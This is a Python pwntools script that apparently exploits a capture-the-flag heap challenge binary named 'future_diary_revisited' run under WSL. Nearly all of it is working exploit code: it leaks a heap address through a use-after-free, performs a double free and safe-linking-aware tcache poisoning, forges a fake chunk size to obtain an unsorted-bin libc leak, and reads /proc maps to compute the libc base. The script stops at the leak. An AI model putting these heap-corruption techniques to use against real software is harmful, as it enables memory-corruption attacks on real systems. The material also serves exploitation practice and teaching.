from pwn import *
import os
import re
import shlex
import subprocess


context.log_level = "info"


def wsl_path():
    return subprocess.check_output(["wsl", "wslpath", "-a", os.getcwd()]).decode().strip()


def start():
    wp = wsl_path()
    cmd = (
        f"cd {shlex.quote(wp)}/extracted && "
        "echo PID $$ && exec ./future_diary_revisited"
    )
    io = process(["wsl", "bash", "-lc", cmd])
    pid_line = io.recvline()
    pid = int(pid_line.split()[1])
    log.info("linux pid=%d", pid)
    return io, pid


def create(io, idx, size, data=b""):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"page? ", str(idx).encode())
    io.sendlineafter(b"length? ", str(size).encode())
    io.sendafter(b"content? ", data)
    if len(data) < size:
        io.send(b"\n")


def delete(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"page? ", str(idx).encode())


def dump(io, idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"page? ", str(idx).encode())
    return io.recvline(keepends=False)


io, pid = start()

c = bytearray(0x78)
c[0x18:0x20] = p64(0x81)
next_meta = bytearray(0x78)
next_meta[0x10:0x18] = p64(0x500)
next_meta[0x18:0x20] = p64(0x21)
next_meta[0x38:0x40] = p64(0x21)

for i in range(1, 26):
    data = b"A"
    if i == 2:
        data = bytes(c)
    elif i == 12:
        data = bytes(next_meta)
    create(io, i, 0x78, data)

delete(io, 1)
heap_page = u64(dump(io, 1).ljust(8, b"\0"))
p1 = (heap_page << 12) + 0x2A0
c_addr = p1 + 0x80
target = c_addr + 0x20
a_addr = p1 + (23 - 1) * 0x80

for i in range(16, 23):
    delete(io, i)
delete(io, 23)
delete(io, 24)
delete(io, 23)

for i in range(26, 33):
    create(io, i, 0x78, b"D")

poison = p64(target ^ (a_addr >> 12))
if b"\n" in poison:
    raise SystemExit("poison contains newline; retry")
create(io, 33, 0x78, poison)
create(io, 34, 0x78, b"B")
create(io, 35, 0x78, b"A")
create(io, 36, 0x78, b"T")

large = bytearray(0x78)
large[0x18:0x20] = p64(0x501)
delete(io, 2)
create(io, 37, 0x78, bytes(large))
delete(io, 36)

raw = dump(io, 36)
leak = u64(raw.ljust(8, b"\0"))
maps = subprocess.check_output(["wsl", "bash", "-lc", f"cat /proc/{pid}/maps"]).decode()
print(maps)
libc_base = None
for line in maps.splitlines():
    if "libc.so.6" in line and "r--p" in line:
        libc_base = int(line.split("-", 1)[0], 16)
        break
assert libc_base is not None
log.info("unsorted=%#x libc_base=%#x offset=%#x", leak, libc_base, leak - libc_base)
io.sendlineafter(b"> ", b"4")
io.close()
